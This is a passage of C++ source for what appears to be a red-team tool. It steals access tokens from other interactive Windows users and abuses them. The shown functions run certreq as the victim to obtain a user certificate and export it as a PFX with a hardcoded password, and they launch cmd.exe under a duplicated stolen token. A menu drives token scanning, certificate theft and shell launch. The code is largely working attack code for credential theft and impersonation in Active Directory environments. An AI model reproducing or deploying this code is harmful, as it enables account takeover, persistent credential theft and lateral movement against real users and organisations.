        if (token.DisplayId == tokenId) {
            pSelectedToken = &token;
            break;
        }
    }

    if (pSelectedToken == nullptr) {
        wprintf(L"[!] Error: Token ID %d not found in the list.\n", tokenId);
        return;
    }

    wprintf(L"[*]   Using Token for User: %s (Session: %lu)\n", pSelectedToken->Username, pSelectedToken->SessionId);

    // 1. Get Username 
    std::string username = WStringToString(pSelectedToken->UsernameOnly);
    if (username.empty()) {
        wprintf(L"[!] Error: Could not get valid username for token ID %d. Aborting request.\n", tokenId);
        return;
    }
    wprintf(L"[*]   Username: %S\n", username.c_str());
    wprintf(L"[*]   Domain: %S\n", g_userDnsDomain.c_str());


    // Define unique file paths for this user
    std::string infFilePath = PUBLIC_PATH + INF_FILENAME_PREFIX + username + ".inf";
    std::string csrFilePath = PUBLIC_PATH + CSR_FILENAME_PREFIX + username + ".csr";
    std::string cerFilePath = PUBLIC_PATH + CER_FILENAME_PREFIX + username + ".cer";
    std::string pfxFilePath = PUBLIC_PATH + username + ".pfx";

    std::wstring winfFilePath = StringToWString(infFilePath);
    std::wstring wcsrFilePath = StringToWString(csrFilePath);
    std::wstring wcerFilePath = StringToWString(cerFilePath);
    std::wstring wThumbprintFilePath = StringToWString(THUMBPRINT_FILENAME); // Path for the temp thumbprint file

    bool stepSuccess = true;

    // 2. Generate INF File
    /*wprintf(L"[*]   Generating INF file: %S\n", infFilePath.c_str());*/
    if (generateINF(username, g_userDnsDomain, infFilePath).empty()) {
        wprintf(L"[!] Error: Failed to generate INF file for %S. Aborting request.\n", username.c_str());
        stepSuccess = false;
    }

    // 3. Run certreq -new
    if (stepSuccess) {
        //wprintf(L"[*]   Running 'certreq -new'...\n");
        std::wstring cmdNew = L"certreq -new \"" + winfFilePath + L"\" \"" + wcsrFilePath + L"\"";
        if (!RunCommandAsToken(*pSelectedToken, cmdNew)) {
            wprintf(L"[!] Error: 'certreq -new' command failed to execute or returned error for %S.\n", username.c_str());
            stepSuccess = false;
        }
    }

    // 4. Run certreq -submit
    if (stepSuccess) {
        //wprintf(L"[*]   Running 'certreq -submit'...\n");
        std::wstring cmdSubmit = L"certreq -submit -attrib \"CertificateTemplate:user\" \"" + wcsrFilePath + L"\" \"" + wcerFilePath + L"\"";
        if (!RunCommandAsToken(*pSelectedToken, cmdSubmit)) {
            wprintf(L"[!] Error: 'certreq -submit' command failed to execute or returned error for %S.\n", username.c_str());
            stepSuccess = false;
        }
    }

    // 5. Run certreq -accept
    if (stepSuccess) {
        //wprintf(L"[*]   Running 'certreq -accept'...\n");
        std::wstring cmdAccept = L"certreq -accept \"" + wcerFilePath + L"\"";
        if (!RunCommandAsToken(*pSelectedToken, cmdAccept)) {
            wprintf(L"[!] Error: 'certreq -accept' command failed to execute or returned error for %S.\n", username.c_str());

            stepSuccess = false;
        }
    }


    if (stepSuccess) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }


    std::string thumbprint = "";
    if (stepSuccess) {
        //wprintf(L"[*]   Getting certificate thumbprint...\n");
        std::wstring cmdThumb = getLatestThumbprintCommand();
        if (!RunCommandAsToken(*pSelectedToken, cmdThumb)) {
            wprintf(L"[!] Error: PowerShell command to get thumbprint failed for %S. Cannot export PFX.\n", username.c_str());
            stepSuccess = false;
        }
        else {

            thumbprint = readThumbprintFromFile();
            if (thumbprint.empty()) {
                wprintf(L"[!] Error: Failed to read thumbprint from file for %S. Cannot export PFX.\n", username.c_str());
                stepSuccess = false;
            }
            else {
                wprintf(L"[*]     Thumbprint found: %S\n", thumbprint.c_str());
            }
        }
    }

    // 7. Export PFX 
    if (stepSuccess) {
        wprintf(L"[*]   Exporting certificate to PFX...\n");
        std::wstring cmdExport = exportPFXCommand(thumbprint, username);
        if (!RunCommandAsToken(*pSelectedToken, cmdExport)) {
            wprintf(L"[!] Error: PowerShell command to export PFX failed for %S.\n", username.c_str());

            stepSuccess = false;
        }
        else {
            wprintf(L"[+] Successfully requested certificate and exported PFX for user %S. PFX potentially at: %S\n", username.c_str(), pfxFilePath.c_str());
            wprintf(L"[!!!] Password for Certificate: '1qaz!QAZ' \n");
        }
    }

    if (!stepSuccess) {
        wprintf(L"[-] Certificate request process failed for Token ID %d.\n", tokenId);
    }

    // Cleanup intermediate files regardless of success/failure for this token
    /*wprintf(L"[*]   Cleaning up intermediate files for %S...\n", username.c_str());*/
    DeleteFileW(winfFilePath.c_str());
    DeleteFileW(wcsrFilePath.c_str());
    DeleteFileW(wcerFilePath.c_str());
    DeleteFileW(wThumbprintFilePath.c_str());

    /*wprintf(L"--- Finished processing Token ID: %d ---\n", tokenId);*/
}

void OpenCmdAsToken(const TOKEN& tokenInfo) {
    wprintf(L"\n--- Attempting to Open CMD for Token ID: %d ---\n", tokenInfo.DisplayId);
    wprintf(L"[*]   Using Token for User: %s (Session: %lu, Integrity: %ls)\n", tokenInfo.Username, tokenInfo.SessionId, tokenInfo.TokenIntegrity);

    HANDLE hPrimaryToken = NULL; PROCESS_INFORMATION pi = { 0 }; STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default"); // Make it interactive
    bool processCreated = false; DWORD lastError = 0;

    // 1. Duplicate Token
    if (!DuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) { wprintf(L"[!] DuplicateTokenEx failed. Error: %lu\n", GetLastError()); return; }
    /*wprintf(L"[*]   Successfully duplicated token...\n");*/

    // 2. Set Session ID (Best effort)
    DWORD targetSessionId = (g_currentSessionId != (DWORD)-1) ? g_currentSessionId : tokenInfo.SessionId; if (targetSessionId != (DWORD)-1) { SetTokenInformation(hPrimaryToken, TokenSessionId, &targetSessionId, sizeof(DWORD)); }

    // 3. Prepare Command Line & Directory
    wchar_t mutableCommandLine[COMMAND_LENGTH]; wcscpy_s(mutableCommandLine, COMMAND_LENGTH, L"C:\\Windows\\System32\\cmd.exe"); std::wstring currentDir = StringToWString(PUBLIC_PATH);

    // 4. Create Process (Try AsUser first)
    /*wprintf(L"[*]   Trying CreateProcessAsUserW...\n");*/
    if (CreateProcessAsUserW(hPrimaryToken, NULL, mutableCommandLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi))
    {
        wprintf(L"[*]   CreateProcessAsUserW succeeded. CMD launched (PID: %lu)\n", pi.dwProcessId); processCreated = true;
    }
    else { lastError = GetLastError(); /*wprintf(L"[!]   CreateProcessAsUserW failed. Error: %lu\n", lastError);*/ if (lastError == 1314) { /*wprintf(L"[*]   Trying CreateProcessWithTokenW as fallback...\n");*/ if (CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, NULL, mutableCommandLine, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi)) { wprintf(L"[*]   CreateProcessWithTokenW succeeded. CMD launched (PID: %lu)\n", pi.dwProcessId); processCreated = true; } else { lastError = GetLastError(); wprintf(L"[!]   CreateProcessWithTokenW also failed. Error: %lu\n", lastError); } } else { /* Failed for other reason */ } }

    // 5. Cleanup handles (Important: Close process/thread handles for the launched CMD)
    if (processCreated) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    CloseHandle(hPrimaryToken);

    if (!processCreated) { wprintf(L"[-] Failed to launch CMD for Token ID %d.\n", tokenInfo.DisplayId); }
    wprintf(L"--- Finished CMD launch attempt for Token ID: %d ---\n", tokenInfo.DisplayId);
}

// --- Main Entry Point ---
int wmain(int argc, wchar_t* argv[]) {
    //std::wcout << L"[DBG] === Interactive Certificate Requester START ===" << std::endl;

    //std::wcout << L"[DBG] Calling InitializePrivileges()..." << std::endl;
    if (!InitializePrivileges()) {
        std::wcout << L"[!] Warning: Failed to enable some privileges. Functionality may be limited." << std::endl;
    }
    else {
       std::wcout << L"[DBG] Privileges initialized." << std::endl;
    }

    // --- Get Global Domain Name ---
   // std::wcout << L"[DBG] Retrieving USERDNSDOMAIN..." << std::endl;
    g_userDnsDomain = GetUserDnsDomain();
    if (g_userDnsDomain.empty()) {
        std::wcout << L"[-] Could not determine user DNS domain" << std::endl;
        //std::wcout << L"[DBG] USERDNSDOMAIN is empty!" << std::endl;
        //return 1; // בכוונה לא מחזיר כאן, רק דיבוג
    }
    std::wcout << L"[*] Determined User DNS Domain: " << g_userDnsDomain.c_str() << std::endl;

   // std::wcout << L"[DBG] Sleeping 3 seconds..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(3));

    wprintf(L"[*] Attempting to adjust Desktop/WindowStation ACLs...\n");
   // std::wcout << L"[DBG] Calling ACL_Change::AdjustDesktop()..." << std::endl;

    if (!ACL_Change::AdjustDesktop()) {
        wprintf(L"[!] Failed to adjust desktop ACLs (Error: %S). CreateProcessAsUser may fail interaction.\n", ACL_Change::GetLastErrorAsString().c_str());
       // std::wcout << L"[DBG] ACL_Change::AdjustDesktop() failed!" << std::endl;
    }
    else {
        wprintf(L"[*] Successfully adjusted desktop ACLs (or already correct).\n");
       // std::wcout << L"[DBG] ACLs adjusted OK." << std::endl;
    }

    int choice = 0;
    do {
        std::wcout << L"\n--- Menu ---" << std::endl;
        std::wcout << L"1. Scan and Display Interactive User Tokens" << std::endl;
        std::wcout << L"2. Request Certificate for Selected Token ID" << std::endl;
        std::wcout << L"3. Open cmd.exe" << std::endl;
        std::wcout << L"4. Exit" << std::endl;
        std::wcout << L"Enter your choice: ";

        std::wcin >> choice;
       // std::wcout << L"[DBG] Menu input: " << choice << std::endl;

        if (std::wcin.fail()) {
            std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
           // std::wcout << L"[DBG] std::wcin.fail() after menu input." << std::endl;
            ClearInputBuffer();
            choice = 0;
            continue;
        }
        ClearInputBuffer();

        //std::wcout << L"[DBG] Sleeping 5 seconds before processing menu option..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));

        switch (choice) {
        case 1:
            std::wcout << L"[DBG] Option 1: Scanning tokens..." << std::endl;
            CleanupTokenHandles();
            std::wcout << L"[DBG] Token handles cleaned up." << std::endl;
            if (DiscoverAndStoreTokens()) {
                std::wcout << L"[DBG] Token discovery succeeded. Displaying list..." << std::endl;
                DisplayTokenList();
            }
            else {
                std::wcout << L"[-] Token discovery failed." << std::endl;
               std::wcout << L"[DBG] DiscoverAndStoreTokens() returned false!" << std::endl;
            }
            break;

        case 2: // Request Certificate
            std::wcout << L"[DBG] Option 2: Request certificate..." << std::endl;
            if (g_discoveredTokens.empty()) {
                std::wcout << L"[-] No tokens discovered. Please Scan first (Option 1)." << std::endl;
               // std::wcout << L"[DBG] g_discoveredTokens is empty!" << std::endl;
            }
            else {
                int selectedId = 0;
                std::wcout << L"\n[*] Enter the ID of the token to use for certificate request: ";
                std::wcin >> selectedId;

               // std::wcout << L"[DBG] User selected token ID: " << selectedId << std::endl;
                if (std::wcin.fail()) {
                    std::wcout << L"[-] Invalid input. Please enter a number for the ID." << std::endl;
                  //  std::wcout << L"[DBG] std::wcin.fail() after token id input." << std::endl;
                    ClearInputBuffer();
                }
                else {
                    ClearInputBuffer();
                    RequestCertificateForToken(selectedId);
                   // std::wcout << L"[DBG] Finished RequestCertificateForToken(" << selectedId << L")" << std::endl;
                }
            }
            break;
        case 3:
            //std::wcout << L"[DBG] Option 3: Open cmd.exe for token..." << std::endl;
            if (g_discoveredTokens.empty()) {
                std::wcout << L"[!] No tokens discovered..." << std::endl;
               // std::wcout << L"[DBG] g_discoveredTokens is empty!" << std::endl;
            }
            else {
                int selectedId = 0;
                std::wcout << L"\n[*] Enter Token ID to open CMD with: ";
                std::wcin >> selectedId;
               // std::wcout << L"[DBG] User selected token ID: " << selectedId << std::endl;
                if (std::wcin.fail()) {
                    std::wcout << L"[!] Invalid ID." << std::endl;
                   // std::wcout << L"[DBG] std::wcin.fail() after token id input." << std::endl;
                    ClearInputBuffer();
                }
                else {
                    ClearInputBuffer();
                    const TOKEN* pSelectedTokenCmd = nullptr;
                    for (const auto& token : g_discoveredTokens) {
                        if (token.DisplayId == selectedId) {
                            pSelectedTokenCmd = &token;
                            break;
                        }
                    }
                    if (pSelectedTokenCmd == nullptr) {
                        wprintf(L"[!] Error: Token ID %d not found.\n", selectedId);
                      //  std::wcout << L"[DBG] pSelectedTokenCmd is nullptr!" << std::endl;
                    }
                    else {
                        OpenCmdAsToken(*pSelectedTokenCmd);
                      //  std::wcout << L"[DBG] OpenCmdAsToken() called with token ID " << selectedId << std::endl;
                    }
                }
            }
            break;

        case 4: // Exit
            std::wcout << L"[*] Exiting..." << std::endl;
            //std::wcout << L"[DBG] Program exit requested." << std::endl;
            break;

        default:
            std::wcout << L"[!] Invalid choice. Please try again." << std::endl;
          //  std::wcout << L"[DBG] Invalid menu option." << std::endl;
        }

       // std::wcout << L"[DBG] Sleeping 4 seconds before returning to menu..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(4));

    } while (choice != 4);

    //std::wcout << L"[DBG] Cleaning up token handles at program exit." << std::endl;
    CleanupTokenHandles();
  //  std::wcout << L"[DBG] === Interactive Certificate Requester END ===" << std::endl;
    return 0;
}



// --- Implementations for other functions (EnablePrivilege, etc.) are assumed above ---
// --- Ensure all functions declared in Forward Declarations are implemented ---
